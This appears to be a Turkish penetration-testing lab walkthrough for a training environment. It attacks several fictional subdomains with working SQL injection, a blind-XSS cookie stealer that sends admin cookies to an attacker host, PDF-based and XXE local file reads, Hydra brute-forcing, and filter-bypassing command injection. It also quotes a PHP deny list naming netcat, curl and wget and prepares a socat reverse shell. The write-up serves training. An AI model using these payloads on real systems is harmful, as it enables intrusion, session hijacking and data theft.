Bu site, internete açık olmaması gereken unutulmuş bir uygulama gibi görünüyor. Görünüşe göre bu, loglar arasında arama yapmak için kullanılan bir tür iç uygulama. Tek bir tırnak işareti (') girmek, bir **MySQL hata mesajı** ortaya çıkarıyor ve bu, bir **SQL injection** zafiyetinin varlığını gösteriyor:  
**"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1."**  
Bu durumu, aşağıdaki gibi bir payload kullanarak manuel olarak sömürebiliriz:

```sql
' union select null, database(), user(), @@version -- //
```

Bu durumdan faydalanmak için sqlmap de kullanabiliriz. İlk olarak, Burp kullanarak POST isteğini yakalayın, bir dosyaya kaydedin ve searchitem parametresini bir * ile işaretleyin, böylece sqlmap nereye enjekte edeceğini bilir.

```shell-session
POST / HTTP/1.1
Host: status.inlanefreight.local
Content-Length: 14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://status.inlanefreight.local
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://status.inlanefreight.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=s4nm572fgeaheb3lj86ha43c3p
Connection: close

searchitem=*
```

Ardından, bunu sqlmap aracılığıyla aşağıdaki gibi çalıştırıyoruz:

```shell-session
[!bash!]$ sqlmap -r sqli.txt --dbms=mysql 

<SNIP>

[00:07:24] [INFO] (custom) POST parameter '#1*' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=%' AND 6921=6921#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=%' AND GTID_SUBSET(CONCAT(0x716a787071,(SELECT (ELT(5964=5964,1))),0x716a7a7171),5964) AND 'lVzh%'='lVzh

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=%' AND (SELECT 1227 FROM (SELECT(SLEEP(5)))jrOp) AND 'ENPh%'='ENPh

    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: searchitem=%' UNION ALL SELECT NULL,NULL,CONCAT(0x716a787071,0x78724f676c7967575469546e6b765775707470466457486b78436373696d57546b4f72704d47735a,0x716a7a7171),NULL#
---
[00:07:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[00:07:38] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/status.inlanefreight.local'

[*] ending @ 00:07:38 /2022-06-21/
```

Sonrasında, mevcut veritabanlarını listeleyebiliriz ve **status** veritabanının özellikle ilgi çekici olduğunu görebiliriz:

```shell-session
[!bash!]$ sqlmap -r sqli.txt --dbms=mysql --dbs

<SNIP>

---
[00:09:24] [INFO] testing MySQL
[00:09:24] [INFO] confirming MySQL
[00:09:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 8.0.0
[00:09:24] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] status
[*] sys

[00:09:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/status.inlanefreight.local'

[*] ending @ 00:09:24 /2022-06-21/
```

Durum veritabanına odaklandığımızda, sadece iki tablo olduğunu görürüz:

```shell-session
[!bash!]$ sqlmap -r sqli.txt --dbms=mysql -D status --tables

<SNIP>

---
[00:10:29] [INFO] testing MySQL
[00:10:29] [INFO] confirming MySQL
[00:10:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 8.0.0
[00:10:29] [INFO] fetching tables for database: 'status'
Database: status
[2 tables]
+---------+
| company |
| users   |
+---------+
```

Buradan itibaren, **status** veritabanındaki tüm verileri dump deneyebilir ve bir başka bulgu olan **SQL Injection**'ı kaydedebiliriz. Bunu manuel olarak denemek için **SQL Injection Fundamentals** modülünü rehber olarak kullanabilirsiniz. Araç tabanlı bir yaklaşıma ihtiyaç duyarsanız, **SQLMap Essentials** modülüne başvurabilirsiniz.


## support.inlanefreight.local

Devam edersek, http://support.inlanefreight.local sitesine göz atıyoruz ve bunun bir BT destek portalı olduğunu görüyoruz. Destek bileti portalları canlı bir kullanıcıyla etkileşime geçmemizi sağlayabilir ve bazen bir Cross-Site Scripting (XSS) güvenlik açığı yoluyla bir kullanıcının oturumunu ele geçirebileceğimiz bir client-side saldırısına yol açabilir. Uygulamada gezinirken, bir support ticket oluşturabileceğimiz /ticket.php sayfasını buluyoruz. Bakalım bir tür kullanıcı etkileşimi tetikleyebilecek miyiz? Bir bilet için tüm ayrıntıları doldurun ve Message alanına aşağıdakileri ekleyin:

```javascript
 "><script src=http://10.10.14.15:9000/TESTING_THIS</script>
```

IP'yi kendi IP'niz olarak değiştirin ve 9000 portunda (veya istediğiniz portta) bir Netcat dinleyicisi başlatın. Gönder düğmesine tıklayın ve güvenlik açığını onaylamak için bir callback için listener'ınızı kontrol edin.

```shell-session
[!bash!]$ nc -lvnp 9000

listening on [any] 9000 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.101] 56202
GET /TESTING_THIS%3C/script HTTP/1.1
Host: 10.10.14.15:9000
Connection: keep-alive
User-Agent: HTBXSS/1.0
Accept: */*
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

Bu bir Blind Cross-Site Scripting (XSS) saldırısı örneğidir. Blind XSS tespit yöntemlerini Cross-Site Scripting (XSS) modülünde inceleyebiliriz.

Şimdi bir yöneticinin cookie'sini nasıl çalabileceğimizi bulmamız gerekiyor, böylece giriş yapabilir ve ne tür bir erişim elde edebileceğimizi görebiliriz. Bunu aşağıdaki iki dosyayı oluşturarak yapabiliriz:

1. index.php

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

2. script.js

```javascript
new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie
```

Ardından, saldırı hostunuzda aşağıdaki gibi bir PHP web sunucusu başlatın:

```shell-session
sudo php -S 0.0.0.0:9200
```

Son olarak, yeni bir ticket oluşturun ve mesaj alanına aşağıdakileri gönderin:

```javascript
"><script src=http://10.10.14.15:9200/script.js></script>
```

Web sunucumuzda bir admin session cookie'si ile bir callback alıyoruz:

```shell-session
[!bash!]$ sudo php -S 0.0.0.0:9200

[Tue Jun 21 00:33:27 2022] PHP 7.4.28 Development Server (http://0.0.0.0:9200) started
[Tue Jun 21 00:33:42 2022] 10.129.203.101:40102 Accepted
[Tue Jun 21 00:33:42 2022] 10.129.203.101:40102 [200]: (null) /script.js
[Tue Jun 21 00:33:42 2022] 10.129.203.101:40102 Closing
[Tue Jun 21 00:33:43 2022] 10.129.203.101:40104 Accepted
[Tue Jun 21 00:33:43 2022] 10.129.203.101:40104 [500]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99

<SNIP>
```

Daha sonra, admin'in session cookie'sini kullanarak giriş yapmak için [Cookie-Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search) gibi bir Firefox plugin'i kullanabiliriz.

![Pasted image 20241231173625.png](/img/user/resimler/Pasted%20image%2020241231173625.png)

**Save** butonuna tıklayarak **session** adlı cookie'yi kaydedin ve sağ üstteki **Login** butonuna tıklayın. Her şey beklendiği gibi çalışıyorsa, **[http://support.inlanefreight.local/dashboard.php](http://support.inlanefreight.local/dashboard.php)** adresine yönlendirileceksiniz. Biraz zaman ayırarak bir başka bulgu olan **Cross-Site Scripting (XSS)**'i kaydedin. Bu bulgu, yüksek riskli olarak not edilmelidir çünkü aktif bir admin'in oturumunu çalmak ve ticketing (destek talepleri) kuyruğu sistemine erişmek için kullanılabilir. **Cross-Site Scripting (XSS)** modülüne başvurarak XSS'in nasıl çalıştığını ve bu tür güvenlik açıklarının, oturum kaçırma dahil olmak üzere, farklı şekillerde nasıl kullanılabileceğini gözden geçirin.

## tracking.inlanefreight.local

**[http://tracking.inlanefreight.local/](http://tracking.inlanefreight.local/)** adresindeki site, bir takip numarası girmemize ve siparişimizin durumunu gösteren bir **PDF** oluşturmamıza olanak tanıyor. Uygulama, kullanıcı girdisini alarak bir PDF belgesi oluşturuyor. PDF oluşturma sırasında, **Tracking #:** alanının yalnızca sayıları değil, arama kutusuna yazdığımız herhangi bir girdiyi kabul ettiğini görebiliyoruz.

Eğer arama kutusuna basit bir JavaScript payload’u, örneğin `<script>document.write('TESTING THIS')</script>` yazıp **Track Now** butonuna tıklarsak, PDF’nin oluşturulduğunu ve **TESTING THIS** mesajının görüntülendiğini görüyoruz. Bu durum, JavaScript kodunun web sunucusu PDF’yi oluştururken çalıştığını gösteriyor gibi görünüyor.

![Pasted image 20241231174006.png](/img/user/resimler/Pasted%20image%2020241231174006.png)

HTML de enjekte edebileceğimizi fark ettik. `<h1>test</h1>` gibi basit bir payload, PDF oluşturulduktan sonra Tracking #: alanında da görüntülenecektir. Google'da pdf HTML enjeksiyonu güvenlik açığı gibi bir şey aradığınızda, local dosya okuma için HTML enjeksiyonu, XSS ve SSRF'den yararlanmayı tartışan [bu yazı](https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90) ve[ bu yazı](https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f) gibi birkaç ilginç sonuçla karşılaşırsınız. Şimdi, Penetrasyon Test Cihazı İş Rolü Yolunda ele alınmamış olsa da, değerlendirmelerimiz sırasında sık sık yeni şeylerle karşılaşacağımızı belirtmek önemlidir.


### Beklenmedik Durumlarla Başa Çıkmak

Sızma testi uzmanı zihniyetinin anahtar olduğu yer burasıdır. Uyum sağlayabilmeli, dürtebilmeli ve bulduğumuz bilgileri alıp neler olup bittiğini belirlemek için düşünce sürecimizi uygulayabilmeliyiz. Biraz araştırdıktan sonra, web uygulamasının PDF raporları oluşturduğunu ve göründüğü gibi yalnızca sayıları kabul etmesi gereken bir alana girişi kontrol edebileceğimizi anladık. Biraz araştırma yaparak, henüz aşina olmadığımız, ancak üzerinde önemli araştırma ve dokümantasyon bulunan bir güvenlik açığı sınıfını tanımlayabildik. Birçok araştırmacı kendi değerlendirmelerinden veya hata ödüllerinden son derece ayrıntılı araştırmalar yayınlar ve benzer sorunları bulmaya çalışmak için bunu genellikle bir rehber olarak kullanabiliriz. Hiçbir değerlendirme aynı değildir, ancak yalnızca çok sayıda olası web uygulaması teknolojisi yığını vardır, bu nedenle belirli şeyleri tekrar tekrar görmemiz kaçınılmazdır ve kısa süre sonra yeni ve zor olan şeyler ikinci doğa haline gelir. SSRF ve diğer server-side saldırılar hakkında daha fazla bilgi edinmek için Server-side Attacks modülüne göz atmaya değer.

Hadi bu [writeup](https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f)'ların bazılarını inceleyelim ve benzer bir sonuç üreterek yerel dosya okuma elde edebilir miyiz görelim. Bu gönderiyi takip ederek, **XMLHttpRequest (XHR)** nesnelerini kullanarak yerel dosya okuma testi yapalım ve dinamik olarak oluşturulan **PDF'ler** üzerinden **XSS** ile yerel dosya okuma hakkında bu [harika gönderiye](https://web.archive.org/web/20221207162417/https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/) de danışalım.

Zafiyetin varlığını doğrulamak için, önce herkesin okuyabileceği bir dosya olan **/etc/passwd** dosyasını hedef alarak bu payload'u dosya okuma testi için kullanabiliriz.

```javascript
	<script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///etc/passwd");
	x.send();
	</script>
```

Payload'u arama kutusuna yapıştırıyoruz ve Şimdi Track butonuna basıyoruz ve yeni oluşturulan PDF dosyanın içeriğini bize geri gösteriyor, böylece lokal dosyayı okumuş oluyoruz!

![Pasted image 20241231175125.png](/img/user/resimler/Pasted%20image%2020241231175125.png)

Bu blog yazılarını okumak, bu bulguyu ve etkisini incelemek ve bu tür bir zafiyeti tanımak faydalı olacaktır. Eğer bir **penetration test** sırasında buna benzer, ancak aşina olmadığımız ve "farklı" görünen bir durumla karşılaşırsak, durumu analiz etmek için **Penetration Testing Process**'e başvurabiliriz.

Araştırmamızı yaptıktan sonra bile zafiyeti ortaya çıkaramazsak, denediklerimizi ve düşünce sürecimizi detaylı bir şekilde not etmeliyiz ve ekip arkadaşlarımızdan ya da daha kıdemli takım üyelerimizden yardım istemeliyiz. **Pentest** ekiplerinde genellikle belirli alanlarda uzmanlaşmış ya da daha güçlü olan kişiler bulunur, bu yüzden ekipten biri muhtemelen bu durumu veya benzer bir vakayı görmüştür.

Bu güvenlik açığı ile biraz daha oynayın ve başka nelere erişebileceğinizi görün. Şimdilik bir diğer yüksek riskli bulgu olan SSRF to Local File Read'i not edip yolumuza devam edeceğiz.


## vpn.inlanefreight.local

Sızma testi çalışmaları sırasında VPN ve diğer Remote Access portalları ile karşılaşmak yaygındır. Bu bir Fortinet SSL VPN giriş portalı gibi görünüyor. Test sırasında, kullanılan sürümün bilinen herhangi bir istismara karşı savunmasız olmadığını doğruladık. Bu, hesap kilitlenmesini önlemek için dikkatli ve ölçülü bir yaklaşım benimsememiz koşuluyla, gerçek dünyadaki bir görevde password spreyleme için mükemmel bir aday olabilir.

Birkaç yaygın/zayıf kimlik bilgisi çifti deniyoruz ancak aşağıdaki hata mesajını alıyoruz: Erişim reddedildi, bu yüzden buradan bir sonraki uygulamaya geçebiliriz.


## gitlab.inlanefreight.local

Birçok şirket kendi GitLab örneklerini barındırır ve bazen bunları düzgün bir şekilde kilitlemez. Attacking Common Applications modülünün GitLab - Discovery & Enumeration bölümünde ele alındığı gibi, bir adminin bir GitLab örneğine erişimi sınırlamak için uygulayabileceği birkaç adım vardır:

* Yeni kayıtlar için yönetici onayı gerekliliği
* Kayıt için izin verilen domainlerin yapılandırılmış listeleri
* Reddetme listesini yapılandırma

Bazen yeterince güvenli olmayan bir GitLab örneğiyle karşılaşırız. Bir GitLab örneğine erişim sağlayabilirsek, ne tür veriler bulabileceğimizi görmek için etrafı araştırmaya değer. Parolalar, SSH anahtarları veya erişimimizi ilerletmemize yol açabilecek diğer bilgileri içeren yapılandırma dosyalarını keşfedebiliriz. Kaydolduktan sonra, varsa hangi projelere erişimimiz olduğunu görmek için /explore'a göz atabiliriz. shopdev2.inlanefreight.local projesine erişebildiğimizi görebiliriz, bu da bize DNS Zone Transfer kullanarak ortaya çıkarmadığımız ve muhtemelen subdomain brute-forcing kullanarak bulamayacağımız başka bir subdomain için ipucu verir.

![Pasted image 20241231180701.png](/img/user/resimler/Pasted%20image%2020241231180701.png)

Yeni subdomain'i keşfetmeden önce, başka bir yüksek riskli bulguyu kaydedebiliriz: Yanlış Yapılandırılmış GitLab Örneği.


## shopdev2.inlanefreight.local

GitLab örneğini numaralandırmamız başka bir vhost'a yol açtı, bu yüzden önce /etc/hosts dosyamıza ekleyelim, böylece ona erişebiliriz. http://shopdev2.inlanefreight.local adresine göz attığımızda, /login.php giriş sayfasına yönlendiriliyoruz. Tipik kimlik doğrulama atlamaları bizi bir yere götürmez, bu nedenle Attacking Common Applications modülü Application Discovery & Enumeration bölümüne göre temellere geri dönüyoruz ve bazı zayıf kimlik bilgisi çiftlerini deniyoruz. Bazen en basit şeyler işe yarar (ve evet, hem iç hem de dış ortamda üretimde bu tür şeyler görüyoruz) ve admin:admin ile giriş yapabiliriz. Giriş yaptıktan sonra, toptan ürün satın almak için bir tür çevrimiçi mağaza görüyoruz. Bir URL'de (özellikle dışa dönük) dev özelliğini gördüğümüzde, özellikle sayfanın alt kısmındaki Checkout Process not Implemented yorumu nedeniyle, bunun üretime hazır olmadığını ve araştırmaya değer olduğunu varsayabiliriz.

Enjeksiyon güvenlik açıkları için aramayı test edebilir ve IDOR'lar ve diğer kusurlar için arama yapabiliriz, ancak özellikle ilginç bir şey bulamayız. Alışveriş sepeti ödeme sürecine odaklanarak satın alma akışını test edelim ve Burp Suite'teki istekleri yakalayalım. Sepete bir ya da iki ürün ekleyin ve /cart.php adresine gidin ve I AGREE butonuna tıklayın, böylece Burp'te isteği analiz edebiliriz. Burp'a baktığımızda, gövdede XML ile aşağıdaki gibi bir POST isteği yapıldığını görüyoruz:

```xml
<?xml version="1.0" encoding="UTF-8"?>
    <root>
     <subtotal>
      undefined
     </subtotal>
     <userid>
      1206
     </userid>
    </root>
```

Modül içeriğini, özellikle **Web Attacks** modülünü hatırlayın; bu durum, formun verileri sunucuya **XML** formatında gönderiyor gibi görünmesi nedeniyle **XML External Entity (XXE) Injection** için iyi bir aday gibi görünüyor. Birkaç payload deniyoruz ve sonunda aşağıdaki payload ile **/etc/passwd** dosyasının içeriğini okuyarak yerel dosya okuma işlemini başarıyla gerçekleştirebiliyoruz:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
]>
<root>
	<subtotal>
		undefined
	</subtotal>
	<userid>
		&xxetest;
	</userid>
</root>
```

![Pasted image 20241231181916.png](/img/user/resimler/Pasted%20image%2020241231181916.png)


Bir diğer yüksek riskli bulgu olan XML External Entity (XXE) Enjeksiyonunu not edelim (şu ana kadar epey bir listemiz var!) ve son vhost/ subdomain'e geçelim.

## monitoring.inlanefreight.local

Daha önce **monitoring** vhost'unu keşfetmiştik, bu yüzden süreci tekrar etmeyeceğiz. **ffuf** kullandık, ancak bu tarama işlemi diğer araçlarla da yapılabilir. Daha fazla araca aşina olmak için bunu **GoBuster** ile denemenizi öneririz.

**[http://monitoring.inlanefreight.local](http://monitoring.inlanefreight.local)** adresine gittiğimizde, **/login.php** adresine bir yönlendirme yapılıyor. Bazı kimlik doğrulama atlatma payload'larını ve yaygın zayıf kimlik bilgisi çiftlerini deniyoruz ancak her seferinde **Invalid Credentials!** (Geçersiz Kimlik Bilgileri!) hatası alarak ilerleyemiyoruz. Bu bir giriş formu olduğundan, bunu biraz daha derinlemesine incelemek mantıklı görünüyor. **Burp Intruder** kullanarak formu fuzz etmeyi ve bir **SQL injection** zafiyetine işaret edebilecek bir hata mesajı tetiklemeyi deniyoruz, ancak başarılı olamıyoruz.

Burp Suite'te POST isteği ve yanıtının analizi ilginç bir şey ortaya çıkarmaz. Bu noktada, neredeyse tüm olası web saldırılarını tükettik ve Hydra aracına odaklanan Login Brute Forcing modülünü hatırlayarak modül içeriğine geri dönüyoruz. Bu araç HTTP giriş formlarını brute-force etmek için kullanılabilir, bu yüzden bir deneyelim. SecLists GitHub reposundaki [aynı kelime](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top100.txt) listesini daha önce olduğu gibi kullanacağız.

Hydra'yı, geçersiz oturum açma girişimlerini filtrelemek için Invalid Credentials! hata mesajını belirterek brute-forcing saldırısını gerçekleştirecek şekilde ayarlayacağız. Hatırlaması kolay ancak çok kolay bir şekilde brute-forced/cracked yapılabilen yaygın bir “ keyboard walk” parolası olan admin:12qwaszx kimlik bilgisi çifti için bir isabet alıyoruz.

```shell-session
[!bash!]$ hydra -l admin -P ./passwords.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials!"

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-21 11:32:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 99 login tries (l:1/p:99), ~7 tries per task
[DATA] attacking http-post-form://monitoring.inlanefreight.local:80/login.php:username=admin&password=^PASS^:Invalid Credentials!
[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-21 11:32:22
```

Giriş yaptıktan sonra, bize bir çeşit monitör konsolu sunulur. Eğer help yazarsak, bize bir komutlar listesi sunulur. Bu, kısıtlanmış görevleri yerine getirmek için kısıtlı bir shell ortamı ve dışarıdan maruz kalmaması gereken çok tehlikeli bir şey gibi görünüyor. Penetrasyon Test Cihazı İş Rolü Yolunda öğretilen ve henüz ele almadığımız son güvenlik açığı sınıfı Command Injections.

![Pasted image 20241231182940.png](/img/user/resimler/Pasted%20image%2020241231182940.png)

Her bir komutun üzerinden geçiyoruz. cat /etc/passwd denemesi işe yaramıyor, bu yüzden gerçekten de kısıtlı bir ortamda olduğumuz anlaşılıyor. whoami ve date bize bazı temel bilgiler sağlıyor. Hedefi yeniden başlatmak ve bir servis kesintisine neden olmak istemiyoruz. Diğer dizinlere cd ile ulaşamıyoruz. ls yazmak bize muhtemelen şu anda kısıtlı olduğumuz dizinde depolanan birkaç dosya gösteriyor.

![Pasted image 20241231183008.png](/img/user/resimler/Pasted%20image%2020241231183008.png)

Dosyaları incelediğimizde bir **authentication service** (kimlik doğrulama servisi) buluyoruz ve aynı zamanda bir konteyner içinde olduğumuzu görüyoruz. Listede bulunan son seçenek **connection_test**. Bu komutu çalıştırdığımızda, yalnızca bir **Success** (Başarılı) mesajı alıyoruz ve başka bir şey olmuyor.

**Burp Suite**'e geri dönüp isteği proxy'lediğimizde, **localhost IP 127.0.0.1** için **/ping.php**'ye bir **GET** isteği yapıldığını görüyoruz ve HTTP yanıtı, başarılı bir **ping** saldırısını gösteriyor. Buradan, **/ping.php** script'inin, muhtemelen **shell_exec(ping -c 1 127.0.0.1)** veya benzer şekilde bir komut yürütmek için [**system()**](https://www.php.net/manual/en/function.system.php) fonksiyonunu kullanarak bir işletim sistemi komutunu çalıştırdığını çıkarabiliriz.

Eğer bu script düzgün kodlanmamışsa, kolayca bir **command injection** (komut enjeksiyonu) zafiyetine yol açabilir. Bu nedenle, bazı yaygın payload'ları denememiz gerekiyor.

Bir tür filtrelemenin olduğunu fark ediyoruz çünkü **GET /ping.php?ip=%127.0.0.1;id** ve **GET /ping.php?ip=%127.0.0.1|id** gibi standart payload'lar **Invalid input** (Geçersiz giriş) hatasına yol açıyor, bu da muhtemelen bir karakter kara listesinin kullanıldığını gösteriyor. Bu filtreyi, **Bypassing Space Filters** bölümünde tartışılan metodolojiyi takip ederek, enjeksiyon operatörü olarak bir satır sonu karakteri **%0A** (yeni satır karakteri) kullanarak geçebiliriz. Yeni satır karakterini ekleyerek şöyle bir istek yapabiliriz: **GET /ping.php?ip=127.0.0.1%0a**, ve **ping** hala başarılı oluyor, bu da karakterin kara listeye alınmadığını gösteriyor.

İlk savaşı kazandık ama başka bir tür filtrelemenin daha olduğunu fark ediyoruz, çünkü **GET /ping.php?ip=127.0.0.1%0aid** gibi bir şey denediğimizde hala **Invalid input** hatası alıyoruz. Sonraki adımda, komut sözdizimi ile oynayarak, ikinci filtreyi tek tırnaklar kullanarak geçebileceğimizi görüyoruz. **cURL**'a geçerek, **id** komutunu şu şekilde çalıştırabiliyoruz:

```shell-session
[!bash!]$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'd"

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.045 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

Webdev kullanıcısı olarak komut yürütmeyi başardık. Biraz daha araştırdığımızda, bu hostun birden fazla IP adresine sahip olduğunu görüyoruz, bunlardan biri onu ilk kapsamın bir parçası olan 172.16.8.0/23 ağının içine yerleştiriyor. Bu host'a istikrarlı bir erişim sağlayabilirsek, iç ağa dönebilir ve Active Directory domain'ine saldırmaya başlayabiliriz.

```shell-session
[!bash!]$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'fconfig"

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.048 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.048/0.048/0.048/0.000 ms

<SNIP>

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.203.101  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:67a5  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:67a5  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:67:a5  txqueuelen 1000  (Ethernet)
        RX packets 10055  bytes 1041358 (1.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2316  bytes 4030180 (4.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.8.120  netmask 255.255.254.0  broadcast 172.16.255.255
        inet6 fe80::250:56ff:feb9:a62d  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a6:2d  txqueuelen 1000  (Ethernet)
        RX packets 21515  bytes 1890242 (1.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 15  bytes 1146 (1.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Bir sonraki zorluk, reverse shell elde etmenin bir yolunu bulmak. Tek başına komutlar çalıştırabiliyoruz, ancak boşluk içeren herhangi bir şey çalışmıyor. **Command Injections** modülünün **Bypassing Space Filters** bölümüne geri dönerek, boşluk kısıtlamalarını geçmek için **($IFS)** Linux ortam değişkenini kullanabileceğimizi hatırlıyoruz. Bunu, yeni satır karakteriyle yapılan geçişle birleştirerek, reverse shell elde etmenin yollarını incelemeye başlayabiliriz. Yardımcı olması için, hangi filtrelerin uygulandığını anlamak adına **ping.php** dosyasına bakalım, böylece tahmin yapmamıza gerek kalmaz.

**Burp**'a geri dönüp **GET /ping.php?ip=127.0.0.1%0a'c'at${IFS}ping.php** gibi bir istek gönderdiğimizde, dosya içeriğini alabiliyoruz ve filtreyi aşmak ve reverse shell bir yolunu bulmak için çalışabiliriz.

```php
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$output = '';

function filter($str)
{
  $operators = ['&', '|', ';', '\\', '/', ' '];
  foreach ($operators as $operator) {
    if (strpos($str, $operator)) {
      return true;
    }
  }
  $words = ['whoami', 'echo', 'rm', 'mv', 'cp', 'id', 'curl', 'wget', 'cd', 'sudo', 'mkdir', 'man', 'history', 'ln', 'grep', 'pwd', 'file', 'find', 'kill', 'ps', 'uname', 'hostname', 'date', 'uptime', 'lsof', 'ifconfig', 'ipconfig', 'ip', 'tail', 'netstat', 'tar', 'apt', 'ssh', 'scp', 'less', 'more', 'awk', 'head', 'sed', 'nc', 'netcat'];
  foreach ($words as $word) {
    if (strpos($str, $word) !== false) {
      return true;
    }
  }

  return false;
}

if (isset($_GET['ip'])) {
  $ip = $_GET['ip'];
  if (filter($ip)) {
    $output = "Invalid input";
  } else {
    $cmd = "bash -c 'ping -c 1 " . $ip . "'";
    $output = shell_exec($cmd);
  }
}
?>
<?php
echo $output;
?>
```

Reverse shell almak için seçeneklerin çoğunun işleri zorlaştıracak şekilde filtrelendiğini görebiliriz, ancak bunlardan biri socat değildir. Socat, shell yakalamak ve hatta Pivoting, Tunneling ve Port Forwarding modülünde gördüğümüz gibi pivoting için kullanılabilen çok yönlü bir araçtır. Sistemde kullanılabilir olup olmadığını kontrol edelim ve görelim. Burp'a geri dönüp `GET /ping.php?ip=127.0.0.1%0a'w'h'i'ch${IFS}socat` isteğini kullanmak bize sistemde olduğunu ve /usr/bin/socat adresinde bulunduğunu gösterir.

![Pasted image 20241231183542.png](/img/user/resimler/Pasted%20image%2020241231183542.png)


### Sonraki Adımlar
Artık dışarıya dönük tüm servisler ve web uygulamaları üzerinde çalıştığımıza göre, bir sonraki adımlarımız hakkında iyi bir fikrimiz var. Bir sonraki bölümde, iç ortamda bir reverse shell oluşturmak ve hedef host üzerinde bir çeşit kalıcılık oluşturmak için ayrıcalıklarımızı yükseltmek üzerinde çalışacağız.


Soru : Bir bayrak bulmak için IDOR güvenlik açığını kullanın. Bayrak değerini cevabınız olarak gönderin (bayrak formatı: HTB{}).

Cevap : 


----


### İlk Erişim

